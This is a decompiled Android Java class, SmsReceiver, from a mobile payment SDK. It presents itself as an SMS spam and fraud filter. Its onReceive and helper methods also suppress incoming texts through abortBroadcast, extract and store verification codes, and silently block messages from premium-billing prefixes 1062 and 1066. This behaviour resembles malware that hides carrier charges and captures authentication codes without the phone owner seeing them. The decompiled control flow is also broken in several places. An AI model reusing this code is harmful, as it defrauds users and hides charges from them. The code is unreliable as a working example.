package com.zhangzhifu.sdk.util.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.PowerManager.WakeLock;
import android.telephony.SmsMessage;
import com.zhangzhifu.sdk.a.e;
import java.io.PrintStream;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsReceiver
  extends BroadcastReceiver
{
  static final Object a = new Object();
  static PowerManager.WakeLock b = null;
  private static SmsReceiver j = null;
  private static String l;
  private static String m;
  private static long n;
  private static long o;
  private static boolean r = true;
  private static boolean s = false;
  private static boolean t = true;
  private static boolean u = true;
  private StringBuilder c = new StringBuilder();
  private String d = null;
  private long e;
  private com.zhangzhifu.sdk.util.sms.a.a f = null;
  private String g;
  private String h;
  private String i;
  private final String k = "system.sms.authcode";
  private HashMap p = new HashMap();
  private String q;
  
  public SmsReceiver() {}
  
  private static int a()
  {
    if (o > n) {
      return 1;
    }
    return 2;
  }
  
  private void a(Context paramContext, String paramString)
  {
    abortBroadcast();
    long l1 = this.f.a(this.d, this.c.toString(), this.e, paramString);
    com.zhangzhifu.sdk.util.sms.c.a.a(paramContext, com.zhangzhifu.sdk.util.sms.c.a.b(paramContext) + 1);
    com.zhangzhifu.sdk.util.sms.c.a.a(paramContext, "blockedcount", Long.valueOf(l1).toString());
    this.f = new com.zhangzhifu.sdk.util.sms.a.a(paramContext);
    if (this.f != null) {}
    for (;;)
    {
      try
      {
        this.p = this.f.a(paramContext);
        m = (String)this.p.get("dbSMS_Body");
        System.out.println("=================dbSMS_Body =" + m);
        if ((o == 0L) || (n == 0L)) {
          break label275;
        }
        if (a() != 1) {
          break label250;
        }
        System.out.println();
        this.q = com.zhangzhifu.sdk.util.sms.c.c.a(paramContext, m);
        e.a().p(paramContext, this.q);
        System.out.println("最终的验证码---》" + e.a().r(paramContext));
        this.c.delete(0, this.c.length());
        d(paramContext, "000");
        return;
      }
      catch (NumberFormatException paramString)
      {
        paramString.printStackTrace();
        System.out.println("拦截信箱里无该数据");
        continue;
      }
      System.out.println("=================mDbAdapter === null");
      continue;
      label250:
      if (a() == 2)
      {
        label275:
        do
        {
          this.q = com.zhangzhifu.sdk.util.sms.c.c.a(paramContext, this.c.toString());
          break;
        } while ((o == 0L) || (n != 0L));
        this.q = com.zhangzhifu.sdk.util.sms.c.c.a(paramContext, m);
      }
    }
  }
  
  private boolean a(Context paramContext)
  {
    String[] arrayOfString = com.zhangzhifu.sdk.util.sms.a.c.a(paramContext, this.i);
    int i2 = arrayOfString.length;
    int i1 = 0;
    for (;;)
    {
      if (i1 >= i2) {
        return false;
      }
      if (arrayOfString[i1] != null) {}
      try
      {
        if (Pattern.matches(arrayOfString[i1], this.g))
        {
          this.f = null;
          d(paramContext, "000");
          return true;
        }
        i1 += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        e(paramContext, "004");
      }
    }
    return false;
  }
  
  private boolean a(Context paramContext, boolean paramBoolean)
  {
    String[] arrayOfString2 = com.zhangzhifu.sdk.util.sms.a.c.a(this.f, "type= 1", this.i);
    String[] arrayOfString1 = arrayOfString2;
    if (paramBoolean)
    {
      arrayOfString1 = arrayOfString2;
      if (t) {
        arrayOfString1 = a(arrayOfString2, com.zhangzhifu.sdk.util.sms.a.c.a(this.f, "type= 7", this.i));
      }
    }
    int i2 = arrayOfString1.length;
    int i1 = 0;
    for (;;)
    {
      if (i1 >= i2) {
        return false;
      }
      try
      {
        if (arrayOfString1[i1].contains("?")) {
          arrayOfString1[i1] = arrayOfString1[i1].replaceAll("\\?", ".");
        }
        while (Pattern.matches(arrayOfString1[i1], this.g))
        {
          b(paramContext, "[白号码] " + arrayOfString1[i1]);
          return true;
          if (arrayOfString1[i1].contains("*")) {
            arrayOfString1[i1] = arrayOfString1[i1].replaceAll("\\*", ".*");
          }
        }
        i1 += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        e(paramContext, "005");
        return false;
      }
    }
  }
  
  private static boolean a(String paramString1, String paramString2)
  {
    paramString1 = Pattern.compile(paramString1).matcher(paramString2);
    if (paramString1.find()) {
      return true;
    }
    paramString1.reset();
    return false;
  }
  
  public static String[] a(String[] paramArrayOfString1, String[] paramArrayOfString2)
  {
    if (paramArrayOfString1.length == 0) {
      return paramArrayOfString2;
    }
    if (paramArrayOfString2.length == 0) {
      return paramArrayOfString1;
    }
    String[] arrayOfString = new String[paramArrayOfString1.length + paramArrayOfString2.length];
    System.arraycopy(paramArrayOfString1, 0, arrayOfString, 0, paramArrayOfString1.length);
    System.arraycopy(paramArrayOfString2, 0, arrayOfString, paramArrayOfString1.length, paramArrayOfString2.length);
    return arrayOfString;
  }
  
  private void b(Context paramContext, String paramString)
  {
    this.f.a(this.d, this.e, paramString);
    this.f = null;
    this.c.delete(0, this.c.length());
    d(paramContext, "000");
  }
  
  private boolean b(Context paramContext)
  {
    String[] arrayOfString = com.zhangzhifu.sdk.util.sms.a.c.a(this.f, "type= 4");
    int i2 = arrayOfString.length;
    int i1 = 0;
    for (;;)
    {
      if (i1 >= i2) {
        return false;
      }
      try
      {
        if (arrayOfString[i1].contains("*")) {
          arrayOfString[i1] = arrayOfString[i1].replaceAll("\\*", ".*");
        }
        if (a(arrayOfString[i1], this.h))
        {
          b(paramContext, "[自定白关键词] " + arrayOfString[i1]);
          return true;
        }
        i1 += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        e(paramContext, "006");
      }
    }
    return false;
  }
  
  private boolean c(Context paramContext)
  {
    String[] arrayOfString = com.zhangzhifu.sdk.util.sms.a.c.a(this.f, "type= 0", this.i);
    int i2 = arrayOfString.length;
    StringBuilder localStringBuilder = new StringBuilder();
    int i1 = 0;
    for (;;)
    {
      if (i1 >= i2) {
        return false;
      }
      try
      {
        localStringBuilder.append(arrayOfString[i1].replaceAll("\\?", ".").replaceAll("\\*", ".*"));
        if (Pattern.matches(localStringBuilder.toString(), this.g))
        {
          a(paramContext, "[自定黑号码]" + arrayOfString[i1]);
          return true;
        }
        localStringBuilder.delete(0, localStringBuilder.length());
        i1 += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        e(paramContext, "008");
      }
    }
    return false;
  }
  
  private boolean c(Context paramContext, String paramString)
  {
    String[] arrayOfString = com.zhangzhifu.sdk.util.sms.a.c.a(this.f, "type=5");
    int i2 = arrayOfString.length;
    paramString = Integer.toString(paramString.length());
    int i1 = 0;
    for (;;)
    {
      if (i1 >= i2) {
        return false;
      }
      try
      {
        if (paramString.equals(arrayOfString[i1]))
        {
          a(paramContext, "[自定匹配位数] " + arrayOfString[i1]);
          return true;
        }
        i1 += 1;
      }
      catch (RuntimeException paramString)
      {
        paramString.printStackTrace();
        e(paramContext, "007");
      }
    }
    return false;
  }
  
  private static void d(Context paramContext, String paramString)
  {
    com.zhangzhifu.sdk.util.sms.c.a.a(paramContext, "ErrorCode", paramString);
  }
  
  private boolean d(Context paramContext)
  {
    String[] arrayOfString = com.zhangzhifu.sdk.util.sms.a.c.a(this.f, "type=8");
    int i2 = arrayOfString.length;
    int i1 = 0;
    for (;;)
    {
      if (i1 >= i2) {
        return false;
      }
      try
      {
        if (a(arrayOfString[i1], this.h))
        {
          a(paramContext, "[自定黑词] " + arrayOfString[i1]);
          return true;
        }
        i1 += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        e(paramContext, "009");
      }
    }
    return false;
  }
  
  private static void e(Context paramContext, String paramString)
  {
    com.zhangzhifu.sdk.util.sms.c.a.a(paramContext, "ErrorCode", paramString);
  }
  
  private boolean e(Context paramContext)
  {
    String[] arrayOfString = com.zhangzhifu.sdk.util.sms.a.c.a(this.f, "type='6'");
    int i2 = arrayOfString.length;
    int i1 = 0;
    for (;;)
    {
      if (i1 >= i2) {
        return false;
      }
      try
      {
        if (Pattern.matches(arrayOfString[i1], this.h))
        {
          a(paramContext, "[正则式] " + arrayOfString[i1]);
          return true;
        }
        i1 += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        e(paramContext, "010");
      }
    }
    return false;
  }
  
  private boolean f(Context paramContext)
  {
    String[] arrayOfString;
    int i2;
    int i1;
    if (t)
    {
      arrayOfString = com.zhangzhifu.sdk.util.sms.a.c.a(this.f, "type= 7", this.i);
      i2 = arrayOfString.length;
      i1 = 0;
    }
    for (;;)
    {
      if (i1 >= i2) {
        return false;
      }
      try
      {
        if (arrayOfString[i1].contains("?")) {
          arrayOfString[i1] = arrayOfString[i1].replaceAll("\\?", ".");
        }
        while (Pattern.matches(arrayOfString[i1], this.g))
        {
          b(paramContext, "[内置白号码] " + arrayOfString[i1]);
          return true;
          if (arrayOfString[i1].contains("*")) {
            arrayOfString[i1] = arrayOfString[i1].replaceAll("\\*", ".*");
          }
        }
        i1 += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        e(paramContext, "011");
        return false;
      }
    }
  }
  
  private boolean g(Context paramContext)
  {
    String[] arrayOfString;
    int i2;
    int i1;
    if (u)
    {
      arrayOfString = com.zhangzhifu.sdk.util.sms.a.c.a(this.f, "type='3'");
      i2 = arrayOfString.length;
      i1 = 0;
    }
    for (;;)
    {
      if (i1 >= i2) {
        return false;
      }
      try
      {
        if (a(arrayOfString[i1], this.h))
        {
          a(paramContext, "[内置黑词] " + arrayOfString[i1]);
          return true;
        }
        i1 += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        e(paramContext, "012");
      }
    }
    return false;
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    int i1;
    int i2;
    try
    {
      if (!paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
        break label85;
      }
      arrayOfObject = (Object[])paramIntent.getExtras().get("pdus");
      arrayOfSmsMessage = new SmsMessage[arrayOfObject.length];
      if (arrayOfSmsMessage.equals("")) {
        break label85;
      }
      i1 = 0;
    }
    catch (Exception localException)
    {
      try
      {
        for (;;)
        {
          SmsMessage[] arrayOfSmsMessage;
          label85:
          l = paramIntent.getStringExtra("sysSMS_Body");
          n = paramIntent.getLongExtra("sysSMS_Time", 1111L);
          d(paramContext, "103");
          this.f = null;
          this.f = new com.zhangzhifu.sdk.util.sms.a.a(paramContext);
          this.i = com.zhangzhifu.sdk.util.sms.c.a.a(paramContext);
          this.g = this.d;
          if (this.g.startsWith(this.i)) {
            this.g = this.g.substring(this.i.length());
          }
          d(paramContext, "105");
          this.h = this.c.toString().replaceAll("\\s", "").toLowerCase();
          if ((!r) && (s)) {
            break label479;
          }
          System.out.println("onlycontactwhite" + r);
          System.out.println("period" + s);
          d(paramContext, "106");
          if (!a(paramContext)) {
            break;
          }
          return;
          arrayOfSmsMessage[i1] = SmsMessage.createFromPdu((byte[])arrayOfObject[i1]);
          i1 += 1;
          continue;
          Object[] arrayOfObject = arrayOfSmsMessage[i1];
          this.c.append(arrayOfObject.getMessageBody());
          this.d = arrayOfObject.getOriginatingAddress();
          this.e = arrayOfObject.getTimestampMillis();
          if (((e.B(paramContext) != null) || (!e.B(paramContext).equals(""))) && (this.d.contains(e.B(paramContext))) && (!this.d.equals("10086"))) {
            e.y(paramContext, this.d);
          }
          i1 += 1;
        }
        localException = localException;
        localException.printStackTrace();
      }
      catch (Exception paramIntent)
      {
        label479:
        do
        {
          do
          {
            do
            {
              do
              {
                do
                {
                  do
                  {
                    do
                    {
                      for (;;)
                      {
                        paramIntent.printStackTrace();
                        System.out.println("系统信箱中未查到该信息");
                      }
                      if (!r) {
                        break;
                      }
                    } while ((a(paramContext, true)) || (b(paramContext)));
                    a(paramContext, "[仅放行联系人和白名单]");
                    return;
                    d(paramContext, "109");
                  } while (a(paramContext, false));
                  d(paramContext, "110");
                } while (b(paramContext));
                d(paramContext, "111");
              } while (c(paramContext, this.g));
              d(paramContext, "112");
            } while (c(paramContext));
            d(paramContext, "113");
          } while (d(paramContext));
          d(paramContext, "114");
        } while ((e(paramContext)) || (f(paramContext)));
        if ((!Pattern.matches("1062.*", this.g)) && (!Pattern.matches("1066.*", this.g))) {
          break label617;
        }
        a(paramContext, "[收费业务]");
        return;
        label617:
        paramIntent = new String[19];
        paramIntent[0] = ".*账号.*";
        paramIntent[1] = ".*账户.*";
        paramIntent[2] = ".*汇[^\\p{P}]*钱.*";
        paramIntent[3] = ".*钱[^\\p{P}]*汇.*";
        paramIntent[4] = ".*打[^\\p{P}]*钱.*";
        paramIntent[5] = ".*钱[^\\p{P}]*打.*";
        paramIntent[6] = ".*汇[^\\p{P}]*款.*";
        paramIntent[7] = ".*款[^\\p{P}]*汇.*";
        paramIntent[8] = ".*打[^\\p{P}]*款.*";
        paramIntent[9] = ".*款[^\\p{P}]*打.*";
        paramIntent[10] = ".*存[^\\p{P}]*款.*";
        paramIntent[11] = ".*款[^\\p{P}]*存.*";
        paramIntent[12] = ".*邮政.*包裹.*";
        paramIntent[13] = ".*包裹.*邮政.*";
        paramIntent[14] = ".*机.*幸运.*码.*";
        paramIntent[15] = ".*机号.*幸运.*";
        paramIntent[16] = ".*通知.*违章.*联系.*";
        paramIntent[17] = ".*银行[】\\]\\.\\。]*\\w{0,3}";
        paramIntent[18] = ".*[【\\[].?行[】\\]]*\\w{0,3}";
        i2 = paramIntent.length;
        i1 = 0;
      }
    }
    if (i1 >= arrayOfObject.length)
    {
      this.c.delete(0, this.c.length());
      i2 = arrayOfSmsMessage.length;
      i1 = 0;
      if ((i1 >= i2) && (!paramIntent.getAction().equals("system.sms.authcode"))) {}
    }
    for (;;)
    {
      if (i1 >= i2) {}
      while (!g(paramContext))
      {
        b(paramContext, "[没有规则]");
        return;
        try
        {
          if ((!Pattern.matches(paramIntent[i1], this.h)) || (this.g.length() != 11)) {
            break label828;
          }
          a(paramContext, "[可疑诈骗]");
          return;
        }
        catch (RuntimeException paramIntent)
        {
          paramIntent.printStackTrace();
          e(paramContext, "003");
        }
      }
      continue;
      label828:
      i1 += 1;
    }
  }
}
